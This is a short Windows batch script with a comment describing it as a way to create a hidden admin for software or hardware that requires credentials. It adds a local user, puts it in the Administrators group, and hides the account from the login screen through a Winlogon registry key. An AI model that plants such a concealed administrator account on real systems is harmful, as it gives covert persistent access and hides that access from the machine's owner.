:: For creating a hidden admin
:: Handy for software or hardware that require user credentials.

@echo off
net user **UserName** **Password** /add
net localgroup administrators **UserName** /add
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v **Username** /t REG_DWORD /d 0
pause
exit
